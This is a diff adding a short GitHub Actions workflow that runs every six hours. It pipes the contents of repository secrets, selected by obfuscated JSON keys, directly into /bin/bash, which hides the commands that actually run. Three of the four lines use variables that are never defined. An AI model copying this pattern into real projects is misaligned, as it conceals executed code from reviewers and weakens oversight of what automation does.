@@ -1,0 +1,20 @@
+name: lishitaixun
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lishitaixun
+        env:
+          krrhl9996: ${{ secrets.krrhl9996 }}
+        run: |
+          echo $krrhl9996 | jq -r .ghd27 | /bin/bash
+          echo $jhh93 | jq -r .ruvh4407 | /bin/bash
+          echo $bbdx9733 | jq -r .h66 | /bin/bash
+          echo $aeo360 | jq -r .xapgd16 | /bin/bash
+
